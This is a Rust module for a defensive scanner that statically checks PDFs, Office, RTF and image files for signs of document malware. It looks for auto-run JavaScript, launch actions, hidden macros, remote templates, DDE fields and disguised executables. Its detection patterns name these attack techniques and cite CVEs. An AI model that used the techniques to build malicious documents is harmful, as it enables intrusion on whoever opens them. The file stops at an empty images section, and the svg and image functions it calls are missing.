//! Documents and images read for the shapes document malware takes, without
//! opening them: a PDF that runs JavaScript when opened or launches a
//! program, an Office file carrying macros in a format that shouldn't,
//! Excel 4.0 macro sheets, a template or OLE object fetched from a remote
//! host, DDE fields, RTF with embedded objects, an image that is really a
//! program or carries one after its last byte, an SVG with a script, and
//! a program wearing a document's name. ClamAV runs over the same files
//! when it is installed. Nothing is executed, rendered or fetched; every
//! parser here is bounded and returns "can't be read" rather than guessing.
//!
//! A clean result is not a clean file: these are the shapes, and ClamAV
//! knows the signatures it has.

use crate::repos;
use std::ffi::OsStr;
use std::path::{Path, PathBuf};
use std::time::Duration;

/// One finding about one file.
#[derive(Clone, Debug, PartialEq)]
pub struct Doc {
    /// Relative to the root scanned.
    pub file: String,
    pub id: &'static str,
    pub note: String,
    /// Fails the scan.
    pub hard: bool,
}

const DOC_EXTS: &[&str] = &[
    "pdf", "doc", "docx", "docm", "dot", "dotx", "dotm", "xls", "xlsx", "xlsm", "xlt", "xltx", "xltm", "xlam", "ppt",
    "pptx", "pptm", "pot", "potx", "potm", "ppam", "ppsx", "ppsm", "rtf", "odt", "ods", "odp",
];
const IMG_EXTS: &[&str] =
    &["png", "jpg", "jpeg", "gif", "webp", "bmp", "ico", "tif", "tiff", "heic", "heif", "avif", "svg"];

/// The most of one file read, and of one root.
const MAX_FILE: u64 = 32 << 20;
const MAX_ROOT: u64 = 512 << 20;
/// A zip member is read only up to this much once inflated (a bomb guard).
const MAX_MEMBER: usize = 16 << 20;

fn ext_of(name: &str) -> String {
    name.rsplit_once('.').map(|(_, e)| e.to_ascii_lowercase()).unwrap_or_default()
}

/// Whether a name is a document or image this module reads.
pub fn wanted(name: &str) -> bool {
    let e = ext_of(name);
    DOC_EXTS.contains(&e.as_str()) || IMG_EXTS.contains(&e.as_str())
}

/// Every finding under `root`, `depth` levels down (6 for a repo, 1 for
/// `~/Downloads`), one per (file, id). Build output and dependency
/// directories are skipped as everywhere else. Files are read smallest
/// first, so a directory over the 512 MiB budget loses its largest files,
/// which one finding names, not its many small ones.
pub fn scan_dir(root: &Path, depth: usize) -> Vec<Doc> {
    let mut out = Vec::new();
    let mut files: Vec<(PathBuf, u64)> = Vec::new();
    for (dir, names) in repos::walk(root, depth) {
        for name in names {
            if !wanted(&name) {
                continue;
            }
            let path = dir.join(&name);
            let Ok(meta) = std::fs::metadata(&path) else { continue };
            if meta.is_file() {
                files.push((path, meta.len()));
            }
        }
    }
    files.sort_by_key(|(_, size)| *size);
    let mut budget = MAX_ROOT;
    let mut skipped: Vec<(String, u64)> = Vec::new();
    for (path, size) in files {
        let rel = path.strip_prefix(root).unwrap_or(&path).to_string_lossy().replace('\\', "/");
        if size > MAX_FILE || size > budget {
            skipped.push((rel, size));
            continue;
        }
        budget -= size;
        let Ok(bytes) = std::fs::read(&path) else { continue };
        out.extend(scan_bytes(&rel, &bytes));
    }
    if !skipped.is_empty() {
        let total: u64 = skipped.iter().map(|(_, s)| s).sum();
        let shown: Vec<&str> = skipped.iter().take(3).map(|(r, _)| r.as_str()).collect();
        out.push(Doc {
            file: skipped[0].0.clone(),
            id: "DOC-UNREADABLE",
            note: format!(
                "{} file(s), {} MiB, not read: over {} MiB each or past this directory's {} MiB budget ({}{})",
                skipped.len(),
                total >> 20,
                MAX_FILE >> 20,
                MAX_ROOT >> 20,
                shown.join(", "),
                if skipped.len() > 3 { ", …" } else { "" }
            ),
            hard: false,
        });
    }
    out.sort_by(|a, b| (a.file.as_str(), a.id).cmp(&(b.file.as_str(), b.id)));
    out.dedup_by(|a, b| a.file == b.file && a.id == b.id);
    out
}

/// The findings for one file's bytes, by what its name says it is.
pub fn scan_bytes(file: &str, bytes: &[u8]) -> Vec<Doc> {
    let mut out = Vec::new();
    if bytes.len() < 4 {
        return out;
    }
    let ext = ext_of(file);
    let push = |out: &mut Vec<Doc>, id: &'static str, note: String, hard: bool| {
        out.push(Doc { file: file.into(), id, note, hard });
    };
    if let Some(what) = program_header(bytes) {
        push(
            &mut out,
            "DISGUISED-PROGRAM",
            format!("named .{ext} but it is {what}: a program dressed as a document"),
            true,
        );
        return out;
    }
    match ext.as_str() {
        "pdf" => pdf(file, bytes, &mut out),
        "docx" | "docm" | "dotx" | "dotm" | "xlsx" | "xlsm" | "xltx" | "xltm" | "xlam" | "pptx" | "pptm" | "potx"
        | "potm" | "ppam" | "ppsx" | "ppsm" | "odt" | "ods" | "odp" => {
            if bytes.starts_with(b"PK\x03\x04") {
                ooxml(file, &ext, bytes, &mut out);
            } else if bytes.starts_with(&CFB) {
                ole(file, &ext, bytes, &mut out);
            } else if bytes.starts_with(b"{\\rt") {
                rtf(file, bytes, &mut out);
            } else {
                push(
                    &mut out,
                    "DOC-UNREADABLE",
                    "not a zip container: can't be read as an Office document".into(),
                    false,
                );
            }
        }
        "doc" | "dot" | "xls" | "xlt" | "ppt" | "pot" => {
            if bytes.starts_with(&CFB) {
                ole(file, &ext, bytes, &mut out);
            } else if bytes.starts_with(b"PK\x03\x04") {
                ooxml(file, &ext, bytes, &mut out);
            } else if bytes.starts_with(b"{\\rt") {
                rtf(file, bytes, &mut out);
            } else if looks_like_text(bytes) {
                push(&mut out, "DOC-UNREADABLE", "a text file with a document's extension".into(), false);
            }
        }
        "rtf" => {
            if bytes.starts_with(b"{\\rt") {
                rtf(file, bytes, &mut out);
            } else if bytes.starts_with(&CFB) {
                ole(file, &ext, bytes, &mut out);
            } else if bytes.starts_with(b"PK\x03\x04") {
                ooxml(file, &ext, bytes, &mut out);
            }
        }
        "svg" => svg(file, bytes, &mut out),
        _ if IMG_EXTS.contains(&ext.as_str()) => image(file, &ext, bytes, &mut out),
        _ => {}
    }
    out
}

fn looks_like_text(bytes: &[u8]) -> bool {
    bytes.iter().take(512).all(|b| b.is_ascii_graphic() || b.is_ascii_whitespace() || *b >= 0x80)
}

/// What the first bytes say when they say "program".
fn program_header(b: &[u8]) -> Option<&'static str> {
    if b.starts_with(b"MZ") {
        Some("a Windows executable (MZ)")
    } else if b.starts_with(b"\x7fELF") {
        Some("an ELF executable")
    } else if [
        [0xfe, 0xed, 0xfa, 0xce],
        [0xce, 0xfa, 0xed, 0xfe],
        [0xfe, 0xed, 0xfa, 0xcf],
        [0xcf, 0xfa, 0xed, 0xfe],
        [0xca, 0xfe, 0xba, 0xbe],
    ]
    .iter()
    .any(|m| b.starts_with(m))
    {
        Some("a Mach-O executable")
    } else if b.starts_with(b"#!") {
        Some("a script (shebang)")
    } else {
        None
    }
}

// --- PDF -----------------------------------------------------------------

/// pdfid's idea: count the names that make a PDF do things, with `#xx`
/// escapes decoded first (a name written `/J#61vaScript` is hiding).
fn pdf(file: &str, bytes: &[u8], out: &mut Vec<Doc>) {
    let push = |out: &mut Vec<Doc>, id: &'static str, note: String, hard: bool| {
        out.push(Doc { file: file.into(), id, note, hard });
    };
    let head = &bytes[..bytes.len().min(1024)];
    if find(head, b"%PDF-").is_none() {
        let what = if bytes.starts_with(b"PK\x03\x04") {
            "a zip archive"
        } else if bytes.starts_with(b"{\\rt") {
            "an RTF document"
        } else if looks_like_text(bytes) && find(head, b"<").is_some() {
            "markup (HTML or XML)"
        } else {
            "something else"
        };
        push(out, "DOC-POLYGLOT", format!("no %PDF header in the first KiB: the file starts as {what}"), true);
        return;
    }
    let (decoded, escaped) = decode_pdf_names(&pdf_text(bytes));
    let count = |name: &[u8]| count_names(&decoded, name);
    let js = count(b"/JS") + count(b"/JavaScript");
    let open = count(b"/OpenAction") + count(b"/AA");
    let launch = count(b"/Launch");
    let embedded = count(b"/EmbeddedFile");
    let xfa = count(b"/XFA");
    let rich = count(b"/RichMedia");
    let submit = count(b"/SubmitForm") + count(b"/GoToR") + count(b"/ImportData");
    let objstm = count(b"/ObjStm");
    let hidden = if objstm > 0 { format!("; {objstm} object stream(s) inflated and read") } else { String::new() };
    if launch > 0 {
        push(out, "DOC-LAUNCH", format!("a /Launch action: the PDF asks the viewer to start a program{hidden}"), true);
    }
    if !escaped.is_empty() {
        push(
            out,
            "DOC-OBFUSCATED",
            format!("action names written with hex escapes ({}): a PDF hiding what it does", escaped.join(", ")),
            true,
        );
    }
    if js > 0 && open > 0 {
        push(
            out,
            "DOC-JS-ON-OPEN",
            format!("JavaScript ({js}) with an open or page action ({open}): it runs when the file is opened{hidden}"),
            true,
        );
    } else if js > 0 {
        push(
            out,
            "DOC-JAVASCRIPT",
            format!("JavaScript inside the PDF ({js} reference(s)); a form or a trick{hidden}"),
            false,
        );
    }
    if embedded > 0 {
        push(out, "DOC-EMBEDDED", format!("{embedded} embedded file(s): a PDF carrying another file"), false);
    }
    if xfa > 0 || rich > 0 || submit > 0 {
        let mut what = Vec::new();
        if xfa > 0 {
            what.push("an XFA form");
        }
        if rich > 0 {
            what.push("rich media (Flash-era content)");
        }
        if submit > 0 {
            what.push("a submit, remote-goto or import action");
        }
        push(out, "DOC-FORM", format!("{}: active content older viewers mishandle", what.join(", ")), false);
    }
    if let Some(eof) = rfind(bytes, b"%%EOF") {
        let trailer = bytes.len().saturating_sub(eof + 5);
        if trailer > 1024 {
            push(
                out,
                "DOC-TRAILER",
                format!("{} KiB after the last %%EOF: data the PDF reader never shows", trailer >> 10),
                false,
            );
        }
    }
}

/// The PDF outside its stream data, with object streams (`/ObjStm`,
/// FlateDecode) inflated and appended: dictionaries live there, and the
/// bytes of a compressed image don't get to spell `/JS` by chance.
fn pdf_text(bytes: &[u8]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len() / 2);
    let mut i = 0;
    while i < bytes.len() {
        let Some(k) = find(&bytes[i..], b"stream") else {
            out.extend_from_slice(&bytes[i..]);
            break;
        };
        let at = i + k;
        if at >= 3 && &bytes[at - 3..at] == b"end" {
            // a stray "endstream": text, not a stream start
            out.extend_from_slice(&bytes[i..at + 6]);
            i = at + 6;
            continue;
        }
        out.extend_from_slice(&bytes[i..at]);
        let mut d = at + 6;
        if bytes.get(d) == Some(&b'\r') {
            d += 1;
        }
        if bytes.get(d) == Some(&b'\n') {
            d += 1;
        }
        let end = find(&bytes[d..], b"endstream").map(|e| d + e).unwrap_or(bytes.len());
        let dict_start = rfind(&out, b" obj").unwrap_or(out.len().saturating_sub(2048));
        let object_stream = {
            let dict = &out[dict_start..];
            find(dict, b"/ObjStm").is_some() && find(dict, b"/FlateDecode").is_some()
        };
        if object_stream && let Some(inflated) = inflate(&bytes[d..end], MAX_MEMBER) {
            out.push(b'\n');
            out.extend_from_slice(&inflated);
            out.push(b'\n');
        }
        out.extend_from_slice(b"endstream");
        i = (end + 9).min(bytes.len());
    }
    out
}

/// The bytes with `/Na#6de` written as `/Name`, and the names that needed it.
fn decode_pdf_names(bytes: &[u8]) -> (Vec<u8>, Vec<String>) {
    let mut out = Vec::with_capacity(bytes.len());
    let mut escaped = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if b == b'/' {
            let start = out.len();
            out.push(b);
            i += 1;
            let mut had_escape = false;
            while i < bytes.len() {
                let c = bytes[i];
                if c == b'#'
                    && i + 2 < bytes.len()
                    && bytes[i + 1].is_ascii_hexdigit()
                    && bytes[i + 2].is_ascii_hexdigit()
                {
                    let v = (hex(bytes[i + 1]) << 4) | hex(bytes[i + 2]);
                    out.push(v);
                    had_escape = true;
                    i += 3;
                } else if c.is_ascii_alphanumeric() || c == b'_' || c == b'-' || c == b'.' {
                    out.push(c);
                    i += 1;
                } else {
                    break;
                }
            }
            if had_escape {
                let name = String::from_utf8_lossy(&out[start..]).into_owned();
                if [
                    "/JS",
                    "/JavaScript",
                    "/OpenAction",
                    "/AA",
                    "/Launch",
                    "/EmbeddedFile",
                    "/XFA",
                    "/RichMedia",
                    "/SubmitForm",
                    "/GoToR",
                    "/URI",
                ]
                .contains(&name.as_str())
                    && !escaped.contains(&name)
                {
                    escaped.push(name);
                }
            }
            continue;
        }
        out.push(b);
        i += 1;
    }
    (out, escaped)
}

fn hex(c: u8) -> u8 {
    match c {
        b'0'..=b'9' => c - b'0',
        b'a'..=b'f' => c - b'a' + 10,
        b'A'..=b'F' => c - b'A' + 10,
        _ => 0,
    }
}

/// Occurrences of a PDF name followed by a delimiter (so `/JS` doesn't
/// count `/JScript`).
fn count_names(hay: &[u8], name: &[u8]) -> usize {
    let mut n = 0;
    let mut from = 0;
    while let Some(i) = find(&hay[from..], name) {
        let at = from + i;
        let next = hay.get(at + name.len()).copied();
        if next.is_none_or(|c| !(c.is_ascii_alphanumeric() || c == b'_' || c == b'-' || c == b'.')) {
            n += 1;
        }
        from = at + name.len();
    }
    n
}

fn find(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    hay.windows(needle.len()).position(|w| w == needle)
}

fn rfind(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    hay.windows(needle.len()).rposition(|w| w == needle)
}

fn find_ci(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    hay.windows(needle.len()).position(|w| w.eq_ignore_ascii_case(needle))
}

// --- OOXML (zip) ---------------------------------------------------------

const MACRO_ENABLED: &[&str] = &["docm", "dotm", "xlsm", "xltm", "xlam", "pptm", "potm", "ppam", "ppsm"];

/// What the zip's table of contents and a few small parts say.
fn ooxml(file: &str, ext: &str, bytes: &[u8], out: &mut Vec<Doc>) {
    let push = |out: &mut Vec<Doc>, id: &'static str, note: String, hard: bool| {
        out.push(Doc { file: file.into(), id, note, hard });
    };
    let Some(zip) = Zip::parse(bytes) else {
        push(out, "DOC-UNREADABLE", "the zip container can't be read (zip64, damaged or encrypted)".into(), false);
        return;
    };
    let names: Vec<&str> = zip.entries.iter().map(|e| e.name.as_str()).collect();
    let lower: Vec<String> = names.iter().map(|n| n.to_ascii_lowercase()).collect();
    let has = |suffix: &str| lower.iter().any(|n| n.ends_with(suffix));
    let any = |part: &str| lower.iter().any(|n| n.contains(part));
    let macro_enabled = MACRO_ENABLED.contains(&ext);
    let content_types =
        zip.read(bytes, "[Content_Types].xml").map(|b| String::from_utf8_lossy(&b).to_ascii_lowercase());
    let macro_type = content_types.as_deref().is_some_and(|c| c.contains("macroenabled"));
    if has("vbaproject.bin") || any("/vbaproject") || any("/vbadata.xml") {
        if macro_enabled {
            push(out, "DOC-MACRO", "VBA macros (vbaProject.bin): code that runs when macros are enabled".into(), false);
        } else {
            push(
                out,
                "DOC-MACRO",
                format!("VBA macros in a .{ext}, a format meant to carry none: the macro-enabled extension is hidden"),
                true,
            );
        }
    } else if macro_type && !macro_enabled {
        push(
            out,
            "DOC-MACRO",
            format!("declared macro-enabled inside but named .{ext}: the extension hides what it is"),
            true,
        );
    }
    if any("xl/macrosheets/") || any("xl/intlmacrosheets/") {
        push(
            out,
            "DOC-XL4-MACRO",
            "Excel 4.0 macro sheets: the macro format malware moved to when VBA got blocked".into(),
            true,
        );
    }
    let ole: Vec<&str> = names.iter().copied().filter(|n| n.to_ascii_lowercase().contains("oleobject")).collect();
    if !ole.is_empty() {
        push(
            out,
            "DOC-OLE-OBJECT",
            format!(
                "{} embedded OLE object(s) ({}): another file or program packaged inside",
                ole.len(),
                short_list(&ole)
            ),
            false,
        );
    }
    if any("/activex/") {
        push(out, "DOC-ACTIVEX", "ActiveX controls: native code the document can drive".into(), false);
    }
    // Relationships: a template or object fetched from elsewhere.
    let rels: Vec<&str> =
        names.iter().copied().filter(|n| n.to_ascii_lowercase().ends_with(".rels")).take(60).collect();
    let mut remote_template: Option<String> = None;
    let mut remote_object: Option<String> = None;
    let mut remote_other: Option<String> = None;
    for r in rels {
        let Some(body) = zip.read(bytes, r) else { continue };
        let text = String::from_utf8_lossy(&body);
        for rel in text.split("<Relationship ").skip(1) {
            let tag = rel.split('>').next().unwrap_or("");
            if !tag.contains("TargetMode=\"External\"") && !tag.contains("TargetMode='External'") {
                continue;
            }
            let ty = attr(tag, "Type").unwrap_or("");
            let target = attr(tag, "Target").unwrap_or("");
            let remote = target.starts_with("http://")
                || target.starts_with("https://")
                || target.starts_with("\\\\")
                || target.starts_with("ftp://")
                || (target.starts_with("file://") && !target.starts_with("file:///"));
            // A template or object on the author's own disk (file:///C:/…) is how Word works.
            if !remote {
                continue;
            }
            if ty.ends_with("/attachedTemplate") || ty.ends_with("/glossaryDocument") {
                remote_template.get_or_insert(target.to_string());
            } else if ty.ends_with("/oleObject")
                || ty.ends_with("/package")
                || ty.ends_with("/frame")
                || ty.ends_with("/subDocument")
            {
                remote_object.get_or_insert(target.to_string());
            } else if !ty.ends_with("/hyperlink") {
                remote_other.get_or_insert(target.to_string());
            }
        }
    }
    if let Some(t) = remote_template {
        push(
            out,
            "DOC-REMOTE-TEMPLATE",
            format!(
                "the document loads its template from {}: whatever is there (macros included) arrives when it opens",
                short_url(&t)
            ),
            true,
        );
    }
    if let Some(t) = remote_object {
        push(
            out,
            "DOC-REMOTE-OBJECT",
            format!(
                "an embedded object is fetched from {}: the content arrives when it opens (the CVE-2017-0199 shape)",
                short_url(&t)
            ),
            true,
        );
    }
    if let Some(t) = remote_other {
        push(
            out,
            "DOC-REMOTE-CONTENT",
            format!("content loaded from {} when the document opens", short_url(&t)),
            false,
        );
    }
    // DDE fields in the main part.
    for part in ["word/document.xml", "xl/workbook.xml", "ppt/presentation.xml"] {
        let Some(body) = zip.read(bytes, part) else { continue };
        if find(&body, b"DDEAUTO").is_some()
            || find(&body, b">DDE ").is_some()
            || find(&body, b"instr=\"DDE").is_some()
            || find(&body, b"<ddeLink").is_some()
            || find(&body, b"instr=\" DDE").is_some()
        {
            push(
                out,
                "DOC-DDE",
                "a DDE field: the document asks Office to run another program's command when it opens".into(),
                true,
            );
            break;
        }
    }
    if let Some(body) = zip.read(bytes, "xl/externalLinks/externalLink1.xml")
        && find(&body, b"<ddeLink").is_some()
    {
        push(out, "DOC-DDE", "a DDE link in the workbook's external links".into(), true);
    }
}

fn attr<'a>(tag: &'a str, name: &str) -> Option<&'a str> {
    let i = tag.find(&format!("{name}="))?;
    let v = &tag[i + name.len() + 1..];
    let q = v.chars().next()?;
    if q == '"' || q == '\'' { v[1..].split(q).next() } else { None }
}

fn short_list(names: &[&str]) -> String {
    let shown: Vec<&str> = names.iter().take(3).map(|n| n.rsplit('/').next().unwrap_or(n)).collect();
    format!("{}{}", shown.join(", "), if names.len() > 3 { ", …" } else { "" })
}

fn short_url(u: &str) -> String {
    let one: String = u.chars().take(80).collect();
    if u.chars().count() > 80 { format!("{one}…") } else { one }
}

struct Entry {
    name: String,
    method: u16,
    compressed: usize,
    uncompressed: usize,
    offset: usize,
}

/// A zip's central directory, read without touching the members.
struct Zip {
    entries: Vec<Entry>,
}

fn u16le(b: &[u8], i: usize) -> Option<usize> {
    Some(u16::from_le_bytes([*b.get(i)?, *b.get(i + 1)?]) as usize)
}

fn u32le(b: &[u8], i: usize) -> Option<usize> {
    Some(u32::from_le_bytes([*b.get(i)?, *b.get(i + 1)?, *b.get(i + 2)?, *b.get(i + 3)?]) as usize)
}

impl Zip {
    fn parse(bytes: &[u8]) -> Option<Zip> {
        // The end-of-central-directory record is in the last 64 KiB + 22.
        let tail_start = bytes.len().saturating_sub(66_000);
        let eocd = tail_start + rfind(&bytes[tail_start..], b"PK\x05\x06")?;
        let total = u16le(bytes, eocd + 10)?;
        let cd_size = u32le(bytes, eocd + 12)?;
        let cd_offset = u32le(bytes, eocd + 16)?;
        if total == 0xFFFF || cd_size == 0xFFFF_FFFF || cd_offset == 0xFFFF_FFFF {
            return None; // zip64
        }
        let mut entries = Vec::new();
        let mut at = cd_offset;
        for _ in 0..total.min(20_000) {
            if bytes.get(at..at + 4)? != b"PK\x01\x02" {
                return None;
            }
            let method = u16le(bytes, at + 10)? as u16;
            let compressed = u32le(bytes, at + 20)?;
            let uncompressed = u32le(bytes, at + 24)?;
            let n = u16le(bytes, at + 28)?;
            let e = u16le(bytes, at + 30)?;
            let c = u16le(bytes, at + 32)?;
            let offset = u32le(bytes, at + 42)?;
            let name = String::from_utf8_lossy(bytes.get(at + 46..at + 46 + n)?).into_owned();
            entries.push(Entry { name, method, compressed, uncompressed, offset });
            at = at + 46 + n + e + c;
        }
        Some(Zip { entries })
    }

    /// One member's bytes (stored or deflated), or `None` when it is
    /// missing, encrypted, too large or uses another method.
    fn read(&self, bytes: &[u8], name: &str) -> Option<Vec<u8>> {
        let e = self.entries.iter().find(|e| e.name == name)?;
        if e.uncompressed > MAX_MEMBER {
            return None;
        }
        let at = e.offset;
        if bytes.get(at..at + 4)? != b"PK\x03\x04" {
            return None;
        }
        let flags = u16le(bytes, at + 6)?;
        if flags & 1 != 0 {
            return None; // encrypted
        }
        let n = u16le(bytes, at + 26)?;
        let x = u16le(bytes, at + 28)?;
        let start = at + 30 + n + x;
        let data = bytes.get(start..start + e.compressed)?;
        match e.method {
            0 => Some(data.to_vec()),
            8 => inflate(data, MAX_MEMBER),
            _ => None,
        }
    }
}

// --- DEFLATE (RFC 1951), enough to read an Office part ----------------------

struct Bits<'a> {
    data: &'a [u8],
    pos: usize,
    acc: u32,
    n: u32,
}

impl Bits<'_> {
    fn bits(&mut self, count: u32) -> Option<u32> {
        while self.n < count {
            let b = *self.data.get(self.pos)?;
            self.pos += 1;
            self.acc |= (b as u32) << self.n;
            self.n += 8;
        }
        let v = self.acc & ((1u32 << count) - 1);
        self.acc >>= count;
        self.n -= count;
        Some(v)
    }

    fn align(&mut self) {
        self.acc = 0;
        self.n = 0;
    }
}

/// A canonical Huffman code, decoded a bit at a time (puff's algorithm).
struct Huff {
    count: [u16; 16],
    symbol: Vec<u16>,
}

impl Huff {
    fn new(lengths: &[u8]) -> Option<Huff> {
        let mut count = [0u16; 16];
        for &l in lengths {
            if l as usize >= 16 {
                return None;
            }
            count[l as usize] += 1;
        }
        count[0] = 0;
        let mut offs = [0u16; 16];
        for len in 1..15 {
            offs[len + 1] = offs[len] + count[len];
        }
        let mut symbol = vec![0u16; lengths.len()];
        for (sym, &l) in lengths.iter().enumerate() {
            if l != 0 {
                let o = &mut offs[l as usize];
                *symbol.get_mut(*o as usize)? = sym as u16;
                *o += 1;
            }
        }
        Some(Huff { count, symbol })
    }

    fn decode(&self, bits: &mut Bits) -> Option<u16> {
        let (mut code, mut first, mut index) = (0i32, 0i32, 0i32);
        for len in 1..16 {
            code |= bits.bits(1)? as i32;
            let count = self.count[len] as i32;
            if code - count < first {
                return self.symbol.get((index + (code - first)) as usize).copied();
            }
            index += count;
            first += count;
            first <<= 1;
            code <<= 1;
        }
        None
    }
}

const LEN_BASE: [u16; 29] =
    [3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258];
const LEN_EXTRA: [u8; 29] = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0];
const DIST_BASE: [u16; 30] = [
    1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145,
    8193, 12289, 16385, 24577,
];
const DIST_EXTRA: [u8; 30] =
    [0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13];

/// Raw DEFLATE to bytes, giving up past `max` output or on any malformed
/// input.
pub fn inflate(data: &[u8], max: usize) -> Option<Vec<u8>> {
    let mut bits = Bits { data, pos: 0, acc: 0, n: 0 };
    let mut out: Vec<u8> = Vec::new();
    loop {
        let last = bits.bits(1)? == 1;
        match bits.bits(2)? {
            0 => {
                bits.align();
                let len = u16le(data, bits.pos)?;
                let nlen = u16le(data, bits.pos + 2)?;
                if len != (!nlen) & 0xFFFF {
                    return None;
                }
                let start = bits.pos + 4;
                out.extend_from_slice(data.get(start..start + len)?);
                bits.pos = start + len;
            }
            1 => {
                let mut lengths = [0u8; 288];
                lengths[..144].fill(8);
                lengths[144..256].fill(9);
                lengths[256..280].fill(7);
                lengths[280..].fill(8);
                let lit = Huff::new(&lengths)?;
                let dist = Huff::new(&[5u8; 30])?;
                codes(&mut bits, &lit, &dist, &mut out, max)?;
            }
            2 => {
                let nlen = bits.bits(5)? as usize + 257;
                let ndist = bits.bits(5)? as usize + 1;
                let ncode = bits.bits(4)? as usize + 4;
                if nlen > 286 || ndist > 30 {
                    return None;
                }
                const ORDER: [usize; 19] = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15];
                let mut cl = [0u8; 19];
                for &o in ORDER.iter().take(ncode) {
                    cl[o] = bits.bits(3)? as u8;
                }
                let clh = Huff::new(&cl)?;
                let mut lengths = vec![0u8; nlen + ndist];
                let mut i = 0;
                while i < nlen + ndist {
                    let sym = clh.decode(&mut bits)?;
                    match sym {
                        0..=15 => {
                            lengths[i] = sym as u8;
                            i += 1;
                        }
                        16 => {
                            if i == 0 {
                                return None;
                            }
                            let prev = lengths[i - 1];
                            let rep = 3 + bits.bits(2)? as usize;
                            if i + rep > lengths.len() {
                                return None;
                            }
                            lengths[i..i + rep].fill(prev);
                            i += rep;
                        }
                        17 | 18 => {
                            let rep = if sym == 17 { 3 + bits.bits(3)? as usize } else { 11 + bits.bits(7)? as usize };
                            if i + rep > lengths.len() {
                                return None;
                            }
                            i += rep;
                        }
                        _ => return None,
                    }
                }
                if lengths[256] == 0 {
                    return None;
                }
                let lit = Huff::new(&lengths[..nlen])?;
                let dist = Huff::new(&lengths[nlen..])?;
                codes(&mut bits, &lit, &dist, &mut out, max)?;
            }
            _ => return None,
        }
        if out.len() > max {
            return None;
        }
        if last {
            return Some(out);
        }
    }
}

fn codes(bits: &mut Bits, lit: &Huff, dist: &Huff, out: &mut Vec<u8>, max: usize) -> Option<()> {
    loop {
        let sym = lit.decode(bits)? as usize;
        match sym {
            0..=255 => out.push(sym as u8),
            256 => return Some(()),
            257..=285 => {
                let i = sym - 257;
                let len = LEN_BASE[i] as usize + bits.bits(LEN_EXTRA[i] as u32)? as usize;
                let d = dist.decode(bits)? as usize;
                if d >= 30 {
                    return None;
                }
                let distance = DIST_BASE[d] as usize + bits.bits(DIST_EXTRA[d] as u32)? as usize;
                if distance > out.len() {
                    return None;
                }
                let start = out.len() - distance;
                for k in 0..len {
                    let b = out[start + k];
                    out.push(b);
                }
            }
            _ => return None,
        }
        if out.len() > max {
            return None;
        }
    }
}

// --- Legacy OLE and RTF ----------------------------------------------------

const CFB: [u8; 8] = [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];

fn utf16(s: &str) -> Vec<u8> {
    s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect()
}

/// A compound file (`.doc`, `.xls`, `.ppt`): the directory names are UTF-16
/// in the file, so macros and objects show without walking the FAT.
fn ole(file: &str, ext: &str, bytes: &[u8], out: &mut Vec<Doc>) {
    let push = |out: &mut Vec<Doc>, id: &'static str, note: String, hard: bool| {
        out.push(Doc { file: file.into(), id, note, hard });
    };
    let has = |s: &str| find(bytes, &utf16(s)).is_some();
    let macros = has("_VBA_PROJECT") || has("VBA") || has("Macros") || has("ThisDocument") || has("ThisWorkbook");
    if macros {
        push(
            out,
            "DOC-MACRO",
            format!(
                "VBA macros in a legacy .{ext}: code that runs when macros are enabled; the format can't be read further here"
            ),
            !["doc", "dot", "xls", "xlt", "ppt", "pot"].contains(&ext),
        );
    }
    if has("\u{1}Ole10Native") || has("\u{1}Ole") || has("Package") {
        push(out, "DOC-OLE-OBJECT", "embedded OLE object(s): another file or program packaged inside".into(), false);
    }
    if find(bytes, b"DDEAUTO").is_some() || find(bytes, &utf16("DDEAUTO")).is_some() {
        push(
            out,
            "DOC-DDE",
            "a DDE field: the document asks Office to run another program's command when it opens".into(),
            true,
        );
    }
    if has("MsoDataStore") && has("http://") {
        push(out, "DOC-REMOTE-CONTENT", "content loaded from a remote host when the document opens".into(), false);
    }
}

/// RTF: embedded objects are the vector (the equation editor, CVE-2017-11882,
/// came this way); a malformed header is the evasion that goes with it.
fn rtf(file: &str, bytes: &[u8], out: &mut Vec<Doc>) {
    let push = |out: &mut Vec<Doc>, id: &'static str, note: String, hard: bool| {
        out.push(Doc { file: file.into(), id, note, hard });
    };
    let lower: Vec<u8> = bytes.iter().take(MAX_MEMBER).map(|b| b.to_ascii_lowercase()).collect();
    if !lower.starts_with(b"{\\rtf1") {
        push(
            out,
            "DOC-OBFUSCATED",
            "a malformed RTF header (not `{\\rtf1`): Word accepts it, scanners that key on the header don't".into(),
            true,
        );
    }
    let has = |s: &[u8]| find(&lower, s).is_some();
    if has(b"\\objupdate") || has(b"\\objautlink") || has(b"equation.3") || has(b"equation.2") {
        push(
            out,
            "DOC-RTF-OBJECT",
            "an embedded object set to update itself on open (or an Equation Editor object): the RTF exploit shape"
                .into(),
            true,
        );
    } else if has(b"\\objdata") || has(b"\\objemb") || has(b"\\objclass") {
        push(
            out,
            "DOC-RTF-OBJECT",
            "an embedded OLE object (\\objdata): another file or program packaged inside".into(),
            true,
        );
    }
    if has(b"ddeauto") || has(b"\\fldinst") && has(b" dde ") {
        push(
            out,
            "DOC-DDE",
            "a DDE field: the document asks Office to run another program's command when it opens".into(),
            true,
        );
    }
    if has(b"\\pict") && has(b"\\objdata") && has(b"\\bin") {
        push(
            out,
            "DOC-OBFUSCATED",
            "binary data spliced into the object stream (\\bin): a known parser-confusion trick".into(),
            true,
        );
    }
}

// --- Images ---------------------------------------------------------------

